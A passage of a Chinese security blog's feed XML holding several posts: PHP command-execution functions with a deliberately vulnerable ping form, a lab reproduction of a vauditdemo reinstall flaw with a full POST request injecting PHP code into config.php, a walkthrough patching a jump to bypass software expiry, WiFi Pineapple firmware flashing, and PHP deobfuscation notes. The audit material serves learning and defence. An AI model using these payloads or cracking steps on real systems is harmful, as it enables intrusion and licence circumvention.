上传文件的时候，文件名是不能带路径，所以，你需要进行16进制编码</li><li>到数据库中，查看是否写入</li><li>再登录用户</li><li>访问<code>avatar.php</code>文件（只能在burp中看到读取的文件）</li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/4.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/5.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/6.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/7.png" srcset="/img/loading.gif" alt=""></p><hr><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>该处不单单有读取文件，还有其他漏洞</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP中，我们可以对输入进行注入攻击，命令注入也称命令执行<br><code>注入</code>：通过利用无验证码变量构造特殊语句对服务器进行渗透<br>命令执行：可以执行系统或应用指令的漏洞（例如：CMD命令或bash命令）<br>而该漏洞的产生主要是<code>基于一些函数的过滤不严导致</code></p><a id="more"></a><h1 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h1><ul><li><p><code>system()</code></p><p> 执行外部程序，并且显示输出</p><pre><code class="php">system($command[,int &amp;$return_ar]);/*command：要执行的命令return_var：外部命令执行后的返回状态会设置到此变量中*/</code></pre><p>执行系统外部命令时，直接将结果输出到浏览器</p><p>执行成功：true，失败：false</p></li><li><p><code>exec()</code></p><p>主要用于执行外部程序</p><pre><code class="php">exec($command [, array &amp;$output [, int &amp;$return_var ]] );/*command：要执行的命令output：命令执行的输出填充此数组，每行没输出填充数组的一个元素 数组中的数据不包含行尾的空白字符 Ps：如果数组中已经包含部分元素，会在数组末尾追加内容 如果你不想在数组末尾进行追加，在使用之前对数组进行重置（unset）return_var：命令执行后的返回状态会被写入到此变量*/# 例子$command = &quot;ls&quot;;exec($command,$array);print_r($array);// Linux中执行：php ./exec.php</code></pre></li><li><p><code>shell_exec()</code></p><p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回</p><pre><code class="php">shell_exec($cmd);// 如果执行过程中发生错误或者进程不产生输出，则返回NULL</code></pre></li><li><p><code>passthru()</code></p><p>执行外部程序并且显示原始输出</p><pre><code class="php">passthru($command[,int &amp;$return_var]);/*command：要执行的命令return_var：返回状态会被写入到此变量*/</code></pre><p>当所执行的Unix命令输出二进制数据，并且需要直接传输到浏览器时，就需要用到此函数</p></li><li><p><code>pcntl_exec()</code></p><p>在当前进程空间执行指定程序</p><pre><code class="php">pcntl_exec($path[,$args[,$envs]]);/*path：必须是可执行程序路径 或 一个在文件第一行指定一个可执行文件路径标头的脚本 例如第一行：#!/usr/local/bin/perlargs(array)：要传递给程序的参数的字符串数组envs(array)：要传递给程序作为环境变量的字符串数组 数组格式：key=&gt;value key：传递的环境变量的名称 value：环境变量值*/</code></pre></li><li><p><code>popen()</code></p><p>打开进程文件指针</p><pre><code class="php">popen(command,mode);/*command：要执行的命令mode：连接模式 r：只读 w：只写（打开并清空或创建一个新文件）*/# 例子popen(&#39;whoami &gt;&gt; D:/2.txt&#39;,&#39;r&#39;);</code></pre></li><li><p><code>proc_open()</code></p><p>执行一个命令，并且打开用来输入/输出的文件指针</p><pre><code class="php">proc_open($cmd, array $descriptorspec,array &amp;$pipes[,string $cwd[,array $env [,array $other_options]]]);/*cmd：要执行的命令descriptorspec：一个索引数组 数组的键表示描述符 数组元素值表示PHP如何将这些描述传至子进程 0 标准输入 1 标准输出 2 标准错误pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一端的文件指针cwd：要执行命令的初始工作目录，必须是绝对路径，设置为NULL表示使用默认值（当前目录）env：要执行的命令所使用的环境变量other_options：指定一些附加选项 suppress_errors(winds平台)：True，抑制本函数产生的错误 bypass_shell（win平台）：True，绕过cmd.xex shell*/</code></pre></li></ul><p>另外反引号（`）也是可以执行命令，不过实际上这种方式也是调用的shell_exec()函数</p><pre><code class="php">echo `whoami`; // 在后面调用shell_exec()函数实现的</code></pre><hr><h1 id="简易复现"><a href="#简易复现" class="headerlink" title="简易复现"></a>简易复现</h1><p>这是自己手写的超级难看的靶场了吧</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;命令执行&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;cmd.php&quot; method=&quot;POST&quot;&gt;    Ping：&lt;input type=&quot;text&quot; name=&quot;cmd&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;执行&quot; name=&quot;run&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif(isset($_POST[&#39;run&#39;])){    $cmd = $_POST[&#39;cmd&#39;];    if(trim($cmd)){        $run = &#39;ping &#39; . $cmd;        echo &quot;&lt;pre&gt;&quot;.iconv(&#39;GB2312&#39;,&#39;UTF-8&#39;,shell_exec($run)).&quot;&lt;/pre&gt;&quot;;    }else{        echo &quot;IP Error&quot;;    }}?&gt;</code></pre><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ping.jpg" srcset="/img/loading.gif" alt=""></p><p>本意：这只是用来检测网址的连通情况<br>然而，发现我们可以使用一些其他符号进行绕过，执行其他的命令<br>例如：<code>|</code></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/whoami.jpg" srcset="/img/loading.gif" alt=""><br>这里是因为没有对我们输入的字符进行过滤，导致了用户可以通过其他字符进行绕过</p><p>达到执行任意命令的效果</p><hr><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul><li>自定义函数过滤或使用正则</li><li>escapeshellarg()</li><li>escapeshellcmd()</li></ul>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vauditdemo重装漏洞 复现</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>一般在PHP源代码程序都有一个初始安装的功能，如果相关代码没有对参数进行严禁的过滤<br>可能会导致攻击者访问安装页面：<code>install.php</code>，或者构造数据包，对网站进行重写安装<br>从而危害网站安全，甚至直接拿到服务器权限</p><a id="more"></a><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul><li><code>install/install.php</code>文件：</li></ul><pre><code class="php">// 检测install.lock文件是否存在if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;) ) {    header( &quot;Location: ../index.php&quot; ); // 存在则跳转到index.php页面}require_once &#39;../header.php&#39;; // 包含header.php</code></pre><blockquote><p>可以发现这里存在跳转完，并没有执行exit()，存在可能跳转完，该脚本继续执行的可能，导致重装漏洞的发生</p></blockquote><p>接着往下看，在包含了<code>./header.php</code>后</p><p>分别检查了文件是否可写，目录是否存在，数据库链接，登录名，以及数据库名</p><p>然后就进行了数据库的创建</p><pre><code class="php">mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );    $str_tmp=&quot;&lt;?php\r\n&quot;;    $str_end=&quot;?&gt;&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;error_reporting(0);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#39;/sys/install.lock&#39;)){\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;include_once(&#39;../sys/lib.php&#39;);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;    $str_tmp.=&quot;mysql_query(&#39;set names utf8&#39;,\$conn);\r\n&quot;;    $str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;    $str_tmp.=&quot;if (!\$conn)\r\n&quot;;    $str_tmp.=&quot;{\r\n&quot;;    $str_tmp.=&quot;\tdie(&#39;Could not connect: &#39; . mysql_error());\r\n&quot;;    $str_tmp.=&quot;\texit;\r\n&quot;;    $str_tmp.=&quot;}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;session_start();\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=$str_end;    $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; );    fwrite( $fp, $str_tmp );    fclose( $fp );    //创建表    mysql_select_db( $dbname, $con );    mysql_query( &quot;set names &#39;utf8&#39;&quot;, $con );    //导入数据库    $sql=file_get_contents( &quot;install.sql&quot; );    $a=explode( &quot;;&quot;, $sql );    foreach ( $a as $b ) {        mysql_query( $b.&quot;;&quot; );    }    mysql_close( $con );    file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;, &#39;virink&#39;);    echo &quot;&lt;script&gt;if(!alert(&#39;安裝成功&#39;)){window.location.href=&#39;../index.php&#39;;}&lt;/script&gt;&quot;;    exit;</code></pre><p>在这里我们可以发现，创建数据库名，然后系统配置信息，将配置信息写入到<code>config.php</code>文件</p><p>因为在界面中，数据库名是我们可控的</p><p>所以我们需要进入写好的配置文件，查看下是否对数据库名进行过滤</p><ul><li><code>config.php</code>文件</li></ul><pre><code class="php">error_reporting(0);if (!file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &#39;/sys/install.lock&#39;)) {    header(&quot;Location: /install/install.php&quot;);    exit;}include_once &#39;../sys/lib.php&#39;;$host = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;root&quot;;$database = &quot;vauditdemo&quot;;$conn = mysql_connect($host, $username, $password);mysql_query(&#39;set names utf8&#39;, $conn);mysql_select_db($database, $conn) or die(mysql_error());if (!$conn) {    die(&#39;Could not connect: &#39; . mysql_error());    exit;}session_start();</code></pre><p>可以看到该配置文件，并没有对数据库名进行过滤</p><p>所以我们这里可以构造一下闭合语句</p><pre><code class="php"># install.php文件// exp;-- -&quot;;phpinfo();//mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );# config.php文件$database = &quot;exp;-- -&quot;;phpinfo();//</code></pre><p>这里使用<code>-- -</code>注销掉后面的SQL语句，并使用<code>&quot;;</code>闭合掉原始的内容</p><p>最后在<code>//</code>注释掉原来文件中的<code>&quot;;</code></p><p>这样就可以成功将<code>phpinfo()</code>插入到数据库名中，又不影响正常的SQL语句的执行</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>我们在这里测试的是，已经安装好后的靶场</p><p>我们使用<code>Burp</code>对<code>install/install.php</code>进行访问</p><p>会发现它直接跳转到<code>index.php</code>页面，所以我们在这里访问的时候，直接修改POST数据包</p><p>重放一次数据库安装的数据库，并在其中导入我们的恶意代码</p><ul><li>Poc</li></ul><pre><code>POST /install/install.php HTTP/1.1Host: vauditdemo.topUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://vauditdemo.top/install/install.phpCookie: PHPSESSID=8ts4cj6f4anevemrv8nbct6lh1X-Forwarded-For: 8.8.8.8Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 84dbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=&quot;exp;-- -&quot;;phpinfo();//&amp;Submit=%E5%AE%89%E8%A3%9D</code></pre><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/%E6%AD%A3%E5%B8%B8%E5%AE%89%E8%A3%85.jpg" srcset="/img/loading.gif" alt=""></p><p>可以看到我们上面正常安装了<br>接下来就是测试漏洞是否能被我们利用了</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/install.jpg" srcset="/img/loading.gif" alt=""><br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/%E6%9E%84%E9%80%A0%E8%AF%AD%E5%8F%A5.jpg" srcset="/img/loading.gif" alt=""><br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/phpinfo.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fly8wo.github.io/2018/08/26/PHP代码审计安装问题/" target="_blank" rel="noopener">Bad Apple</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梯控模糊搜索软件--跳过弹窗</title>
    <link href="/2019/08/18/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/"/>
    <url>/2019/08/18/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h1><p>今天刚加的一个群，具体是干嘛就不说了<br>就看到有人问一个很久的软件过期了不能打开<br>问有人会绕过吗？</p><p>看到这里小编我只能默默的打开了群文件，点击了下载<br>开始了我们基础的旅行！</p><a id="more"></a><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>1.通过api断点 断弹窗<br>2.寻找到关键call<br>3.找到关键call上面的关键跳<br>4.对其进行修改<br>5.保存</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>首先，我们先来看下运行程序是怎么样的<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/0.png" srcset="/img/loading.gif" alt=""></p><p>我们下断点<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/1.png" srcset="/img/loading.gif" alt=""></p><p>运行程序 – f8下一步 – 一直有弹窗弹出，确定后 – 继续单步<br>出这个call，看上一个call是否有跳转，跳过这个call</p><p><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/2.png" srcset="/img/loading.gif" alt=""></p><p>通过几次跳转，我们可以发现有个<code>&gt;</code>的标记在我们call的下面<br>这代表这有跳转，进入！<br>并且这个跳转是直接跳过我们这个弹窗的call<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/3.png" srcset="/img/loading.gif" alt=""></p><p>我们点击<code>&gt;</code>，可以看到跳转是从哪里来的！<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/4.png" srcset="/img/loading.gif" alt=""><br>可以看到是一个jnz跳转，我们这里可以把jnz跳转修改为<code>无条件跳转--jmp</code>来达到绕过的目的<br>方法很多，并不只局限与这一种!<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/5.png" srcset="/img/loading.gif" alt=""></p><p>最后，我们保存修改即可！<br><img src="/images/%E9%80%86%E5%90%91/%E6%A2%AF%E6%8E%A7%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%A0%B4%E8%A7%A3/6.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随手记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树莓派ssh连接wifi</title>
    <link href="/2019/08/18/%E7%A1%AC%E4%BB%B6/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5wifi/"/>
    <url>/2019/08/18/%E7%A1%AC%E4%BB%B6/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5wifi/</url>
    
    <content type="html"><![CDATA[<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>这里说的是木有显示器的<br>例如：树莓派</p><h2 id="查看已识别wifi"><a href="#查看已识别wifi" class="headerlink" title="查看已识别wifi"></a>查看已识别wifi</h2><pre><code>sudo iwlist wlan0 scan </code></pre><h2 id="修改配置信息"><a href="#修改配置信息" class="headerlink" title="修改配置信息"></a>修改配置信息</h2><pre><code>sudo nano /etc/wpa_supplicant/wpa_supplicant.conf  </code></pre><a id="more"></a><p>添加有密码的wifi</p><pre><code>network={      ssid=&quot;XXXX&quot;      psk=&quot;XXXX&quot;  }  </code></pre><p>添加无密码的wifi</p><pre><code>network={    ssid=&quot;xxxxxxxx&quot;    key_mgmt=NONE  }  </code></pre><p><code>ctrl+o</code> 保存<br><code>ctrl+x</code> 退出</p><h2 id="重启树莓派"><a href="#重启树莓派" class="headerlink" title="重启树莓派"></a>重启树莓派</h2><pre><code>sudo reboot</code></pre><h2 id="wpa-cli"><a href="#wpa-cli" class="headerlink" title="wpa_cli"></a>wpa_cli</h2><p><code>wpa_cli</code> 是命令行界面下的无线网连接工具</p><pre><code>sudo wpa_cli</code></pre><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><pre><code>status：列出目前的联网状态list：列出所有备选网络。目前正连接到的网络会标[CURRENT]，禁用的网络会标[DISABLE]add_network：增加一个备选网络，输出新网络的号码（这个号码替代下文的[network_id]）。注意新网络此时是禁用状态set_network [network_id] ssid “Your SSID”：设置无线网的名称（SSID）set_network [network_id] key_mgmt WPA-PSK：设置无线网的加密方式为WPA-PSK/WPA2-PSKset_network [network_id] psk “Your Password”：设置无线网的PSK密码enable_network [network_id]：启用网络。启用后如果系统搜索到了这个网络，就会尝试连接。disable_network [network_id]：禁用网络save_config：保存配置</code></pre><hr><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><pre><code>&gt; add_network4  ------------ 记住每台机跳出来的OK&gt; set_network 4 psk &quot;Your Password&quot;OK&gt; enable_network 4OK&gt; save_config &lt;--------别忘了这个，否则重启之后网络配置可能丢失OK</code></pre>]]></content>
    
    
    <categories>
      
      <category>硬件相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树莓派</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ar150刷wifipineapple</title>
    <link href="/2019/08/18/%E7%A1%AC%E4%BB%B6/ar150%E5%88%B7wifipineapple/"/>
    <url>/2019/08/18/%E7%A1%AC%E4%BB%B6/ar150%E5%88%B7wifipineapple/</url>
    
    <content type="html"><![CDATA[<p>原文网址：<a href="https://www.freebuf.com/articles/wireless/166709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/166709.html</a></p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>下载AR150路由的wifipineapple的rom，<a href="https://github.com/yearnwang/pineapple-ar150" target="_blank" rel="noopener">AR150-wifipine固件下载</a><br>备份现有路由器版本的rom</p><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>有两种方式：</p><ol><li>利用路由器升级功能</li><li>把rom上传到路由器，然后执行刷机命名，等待完成<pre><code>mtd -r write /tmp/xxxx.rom firmware </code></pre><blockquote><p>Ps：中间不要断电</p></blockquote></li></ol><p>刷机完成之后，浏览器地址输入：<code>172.16.42.1:1471</code>，进入设置界面</p><a id="more"></a><p>以下是图解，这里采用的是路由器升级功能<br><img src="/images/%E7%A1%AC%E4%BB%B6%E7%9B%B8%E5%85%B3/AR150/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E7%A1%AC%E4%BB%B6%E7%9B%B8%E5%85%B3/AR150/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E7%A1%AC%E4%BB%B6%E7%9B%B8%E5%85%B3/AR150/3.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E7%A1%AC%E4%BB%B6%E7%9B%B8%E5%85%B3/AR150/4.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E7%A1%AC%E4%BB%B6%E7%9B%B8%E5%85%B3/AR150/5.png" srcset="/img/loading.gif" alt=""></p><p>如果你卡在了，启动阶段<br>尝试ssh连接后，输入以下命令，等待重启完成</p><pre><code>jffs2reset -y &amp;&amp; reboot </code></pre><p>这里要多谢<code>记忆里的纯真</code>指导，因为我也卡在了准备阶段</p>]]></content>
    
    
    <categories>
      
      <category>硬件相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Wifipineapple</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web/详细分析md5{d_base64}解密方式</title>
    <link href="/2019/08/18/Web/%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90md5%7Bd_base64%7D%E8%A7%A3%E5%AF%86%E6%96%B9%E5%BC%8F/"/>
    <url>/2019/08/18/Web/%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90md5%7Bd_base64%7D%E8%A7%A3%E5%AF%86%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>解析php混淆加密解析的手段</title>
    <link href="/2019/08/18/Web/%E8%A7%A3%E6%9E%90PHP%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%9A%84%E6%89%8B%E6%AE%B5/"/>
    <url>/2019/08/18/Web/%E8%A7%A3%E6%9E%90PHP%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%9A%84%E6%89%8B%E6%AE%B5/</url>
    
    <content type="html"><![CDATA[<p>php做为一门当下非常流行的web语言，常常看到有人求解密php文件，想当年的asp也是一样。一些人不理解为什么要混淆(加密)，甚至鄙视混淆(加密)，在我看来混淆加密代码可以用来防一般的小人，会起到一定的保护作用。</p><h1 id="加密的原因"><a href="#加密的原因" class="headerlink" title="加密的原因"></a>加密的原因</h1><p>1.保护代码，防止别人剽窃<br>2.保护文件，防止别人发现/查杀(php木马 or 后门)<br>3.剽窃了他人代码防止被发现<br>4.其他商业或非商业目的</p><a id="more"></a><p>我一直都比较关注代码的加解密<br>从简单<code>eval  base64</code>,<code>gzcompress</code>,<code>gzinflate</code> 到 <code>威盾</code>，<code>Zend Guard加密</code>，到近期比较流行的一种<code>二进制(unicode乱码)加密</code><br>如 phpjm,phpdp神盾。对比这几种加密方式。</p><h1 id="第一种加密与解密方式"><a href="#第一种加密与解密方式" class="headerlink" title="第一种加密与解密方式"></a>第一种加密与解密方式</h1><p>就是简单的使用函数encode代码之后<br>再eval(decode(‘encode的代码’)),解密非常简单<br>直接把eval替换成exit即可输出源代码，如果经过多层加密，就继续替换下去…</p><pre><code class="php">eval(base64_decode(&#39;PD9waHAgZWNobyAndHh0Y21zLmNvbSc7Pz4=&#39;));</code></pre><h1 id="威盾加密"><a href="#威盾加密" class="headerlink" title="威盾加密"></a>威盾加密</h1><p>第二种威盾加密，做为第一种方式的升级版<br>即把之前的base64之类的系统内置函数变成了匿名函数<br>解密也是一样把eval替换成exit即可</p><pre><code class="php">$OOO0O0O00=__FILE__;$OOO000000=urldecode(&#39;%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72&#39;);$OO00O0000=28;$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5};$OOO0000O0.=$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$OOO0000O0.=$OOO0000O0{3}.$OOO000000{11}.$OOO000000{12}.$OOO0000O0{7}.$OOO000000{5};$O0O0000O0=&#39;OOO0000O0&#39;;eval(($$O0O0000O0(&#39;JE9PME9PMDAwMD.//......省略</code></pre><h1 id="Zend-Guard加密"><a href="#Zend-Guard加密" class="headerlink" title="Zend Guard加密"></a>Zend Guard加密</h1><p>这种加密方式无法像前面一样手动解密,需要用到工具<br>如：<code>dezender黑刀</code><br>目前我知道的就只有php4~php5.2的可以被此工具解密出来<br>解密出来的变量或函数可能比较丑像$_obfuscate开头，因为经过混淆了<br>不过如果在php代码里加上一句代码，可使该程序溢出导致解密失败</p><pre><code class="php">@Zend; 3074; 以下省略乱码</code></pre><h1 id="二进制-unicode乱码-加密"><a href="#二进制-unicode乱码-加密" class="headerlink" title="二进制(unicode乱码)加密"></a>二进制(unicode乱码)加密</h1><p>如phpjm,phpdp神盾<br>这种加密方式其实也是威盾的升级版<br>即把匿名函数字符串经过一系列的打乱分散处理之后，再把函数、变量、字符串替换成经过处理的unicode字符串</p><p>这样生成的文件就不能轻易的修改了。加大了解密的难度，解密方法也简单<br>就是替换掉那些变量和方法，使之成为正常的字符串，再exit即可</p><pre><code class="php">if (!defined(&quot;BEEABDD&quot;)){define(&quot;BEEABDD&quot;, __FILE__);global $?$妰,$唽,$墎儢,$唫敊?$槀垙梽,$厠墪儛?$嚌巵嚀亸,$寬剛檲槗,$拹枩崄厷?$湠湜啔増仦?$憻檮劀瀺晵€?$垵啑崙媺悎剹,$倧€剮寳崊湌倹€,$槏偀梹啅€攢専挄,$剦槙姙儣枓瀿厐巼;function 殸($殸,$妰?&quot;&quot;){.......</code></pre><p>总结：php无扩展加密无非用到的几个函数 eval , preg_replace使用e修饰符 , strtr , base64_decode</p><p>原文地址：<a href="http://www.txtcms.com/content/28.html" target="_blank" rel="noopener">http://www.txtcms.com/content/28.html</a><br>转载：<a href="https://www.waitalone.cn/php-decode.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-decode.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场Access绕过通用防注入</title>
    <link href="/2019/08/18/Web/%E7%BB%95%E8%BF%87ASP%E9%80%9A%E7%94%A8%E9%98%B2%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/18/Web/%E7%BB%95%E8%BF%87ASP%E9%80%9A%E7%94%A8%E9%98%B2%E6%B3%A8%E5%85%A5/</url>
    
